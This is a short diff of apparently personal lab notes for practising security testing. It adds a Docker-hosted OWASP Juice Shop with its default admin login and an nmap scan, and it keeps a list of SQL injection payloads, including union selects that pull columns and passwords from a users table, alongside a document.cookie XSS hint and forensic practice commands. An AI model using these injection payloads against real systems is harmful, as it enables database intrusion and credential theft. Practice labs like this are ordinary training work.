@@ -37,7 +37,15 @@
 
 python3 -m http.server 8080
 sudo tcpdump -i any -w capture.pcap port 8080
+
 sudo systemctl start apache2 mysql
+sudo apt install docker.io -
+sudo systemctl start docker
+sudo systemctl enable docker
+
+docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+admin@juice-sh.op, admin123
+nmap -sV [ip]
 
 1' or '1'='1
 1' order by 1-- -
@@ -46,10 +54,6 @@ sudo systemctl start apache2 mysql
 1' union select column_name,2 from information_schema.columns where table_name = 'users'-- -
 1' select user,password from users-- -
 document.cookie
-
-docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
-admin@juice-sh.op, admin123
-nmap -sV [ip]
 
 echo "Cybersecurity Lab Evidence" > evidence.txt
 dd if=/dev/zero of=practice_disk.dd bs=1M count=100
